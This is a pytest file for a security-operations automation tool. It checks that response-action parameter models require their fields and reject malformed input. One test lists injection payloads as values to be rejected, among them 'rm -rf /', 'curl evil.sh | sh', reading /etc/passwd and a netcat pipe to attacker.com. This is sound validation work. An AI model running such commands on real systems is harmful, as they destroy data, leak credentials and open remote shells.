"""
SafeSOC — SOAR Parameter Validation Tests
Every SoarActionType must have exactly one Pydantic parameter model,
and every model must reject malformed/malicious input rather than
silently accepting it — this is the "malicious indicator values" /
"parameter-template validation" boundary the architecture review
calls for.
"""

import pytest
from pydantic import ValidationError

from app.core.enums import SoarActionType
from app.schemas.soar import (
    ACTION_PARAMETER_MODELS,
    AddIncidentNoteParams,
    BlockIndicatorParams,
    CollectAdditionalEvidenceParams,
    CreateInvestigationActionParams,
    DisableAccountParams,
    EnrichIndicatorParams,
    IncreaseIncidentPriorityParams,
    IsolateEndpointParams,
    RevokeCredentialsParams,
    TerminateProcessParams,
)


def test_every_soar_action_type_has_exactly_one_parameter_model():
    assert set(ACTION_PARAMETER_MODELS.keys()) == set(SoarActionType)


# ── Required-field enforcement ──────────────────────────────────────

def test_isolate_endpoint_requires_host_id():
    IsolateEndpointParams(host_id="DESKTOP-042")
    with pytest.raises(ValidationError):
        IsolateEndpointParams()


def test_isolate_endpoint_rejects_none_host_id():
    """A playbook step whose evidence resolution produced host_id=None must fail validation, not persist a null target."""
    with pytest.raises(ValidationError):
        IsolateEndpointParams(host_id=None)


def test_disable_account_requires_user():
    DisableAccountParams(user="tom.thompson")
    with pytest.raises(ValidationError):
        DisableAccountParams()


def test_revoke_credentials_requires_user():
    RevokeCredentialsParams(user="tom.thompson")
    with pytest.raises(ValidationError):
        RevokeCredentialsParams()


def test_enrich_indicator_requires_indicator():
    EnrichIndicatorParams(indicator="203.0.113.5")
    with pytest.raises(ValidationError):
        EnrichIndicatorParams()


def test_create_investigation_action_requires_description():
    CreateInvestigationActionParams(description="Review this")
    with pytest.raises(ValidationError):
        CreateInvestigationActionParams()


def test_add_incident_note_requires_note():
    AddIncidentNoteParams(note="Automated note")
    with pytest.raises(ValidationError):
        AddIncidentNoteParams()


def test_terminate_process_requires_host_but_process_is_optional():
    TerminateProcessParams(host_id="DESKTOP-042")
    TerminateProcessParams(host_id="DESKTOP-042", process="evil.exe")
    with pytest.raises(ValidationError):
        TerminateProcessParams()


def test_collect_additional_evidence_host_id_is_optional():
    CollectAdditionalEvidenceParams()
    CollectAdditionalEvidenceParams(host_id="DESKTOP-042")


def test_increase_incident_priority_reason_is_optional():
    IncreaseIncidentPriorityParams()
    IncreaseIncidentPriorityParams(reason="Escalated by playbook")


# ── BlockIndicatorParams: the malicious-indicator-value boundary ───

@pytest.mark.parametrize("indicator", ["203.0.113.5", "2001:db8::1", "malicious-domain.example.com", "a.b"])
def test_block_indicator_accepts_valid_ips_and_domains(indicator):
    assert BlockIndicatorParams(indicator=indicator).indicator == indicator


@pytest.mark.parametrize(
    "indicator",
    [
        "",
        "   ",
        "not an indicator",  # whitespace, no dots
        "1.2.3.4; rm -rf /",
        "1.2.3.4 && curl evil.sh | sh",
        "example.com`whoami`",
        "example.com$(cat /etc/passwd)",
        "example.com\nDROP TABLE users;",
        "example.com|nc attacker.com 4444",
    ],
)
def test_block_indicator_rejects_malicious_or_malformed_values(indicator):
    with pytest.raises(ValidationError):
        BlockIndicatorParams(indicator=indicator)


def test_block_indicator_requires_indicator_field():
    with pytest.raises(ValidationError):
        BlockIndicatorParams()


# ── Nothing accepts unexpected extra fields silently changing shape ─

def test_isolate_endpoint_params_model_dump_is_exactly_the_declared_shape():
    validated = IsolateEndpointParams(host_id="DESKTOP-042")
    assert validated.model_dump() == {"host_id": "DESKTOP-042"}
